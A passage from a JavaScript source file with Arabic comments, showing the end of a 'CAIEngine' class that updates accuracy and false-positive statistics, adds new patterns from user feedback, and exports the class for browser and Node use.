            this.stats.accuracy = ((this.stats.accuracy * (total - 1)) + 1) / total;
        } else {
            this.stats.accuracy = (this.stats.accuracy * (total - 1)) / total;
            this.stats.falsePositives++;
        }
    }

    // تحسين النموذج بناءً على التغذية الراجعة
    improveModel(feedback) {
        feedback.forEach(item => {
            if (item.correct !== undefined) {
                this.updateAccuracy(item.correct);
            }
            
            // إضافة أنماط جديدة
            if (item.newPattern) {
                this.patterns.push(item.newPattern);
            }
        });
        
        console.log('🧠 تم تحسين النموذج بناءً على التغذية الراجعة');
    }
}

// تصدير وإتاحة عالمياً
if (typeof window !== 'undefined') {
    window.CAIEngine = CAIEngine;
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = CAIEngine;
}